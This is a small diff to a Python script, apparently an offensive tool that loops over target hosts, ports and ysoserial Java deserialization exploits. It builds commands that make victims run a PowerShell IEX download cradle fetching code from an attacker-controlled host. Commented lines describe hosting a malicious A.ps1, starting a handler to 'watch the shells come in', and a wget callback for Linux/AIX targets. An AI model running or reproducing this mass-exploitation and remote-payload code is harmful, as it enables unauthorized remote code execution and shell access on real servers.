@@ -40,7 +40,7 @@ def main():
    target_tuples = itertools.product(targets, ports, exploits, payloads)
    for target in target_tuples:
       command = 'java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.{2} {0} {1} {3}'.format(target[0], target[1], target[2], target[3], args.host, args.port) + '\"powershell.exe IEX ((New-Object Net.WebClient).DownloadString(\'http://{4}:{5}/?h={0}&p={1}&e={2}&l={3}\'))\"'.format(target[0], target[1], target[2], target[3], args.host, args.port)
-#      command = 'java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.{2} {0} {1} {3}'.format(target[0], target[1], target[2], target[3], args.host, args.port) + '\"powershell.exe IEX ((New-Object Net.WebClient).DownloadString(\'http://{4}:{5}/A.ps1\'))\"' # Create a malicious A.ps1 and host it. Start a handler. Rerun iterpysoserial and watch the shells come in.
+#      command = 'java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.{2} {0} {1} {3}'.format(target[0], target[1], target[2], target[3], args.host, args.port) + '\"powershell.exe IEX ((New-Object Net.WebClient).DownloadString(\'http://{4}:{5}/A.ps1\'))\"' # Create malicious A.ps1 and host it. Start a handler. Rerun iterpysoserial and watch the shells come in.
 
 # It's been a while since I ran this sequence, retest and improve this use case.
 #      command = '\"wget http://{4}:{5}/?h={0}&p={1}&e={2}&l={3}\"' # Linux/AIX targets (step 0)
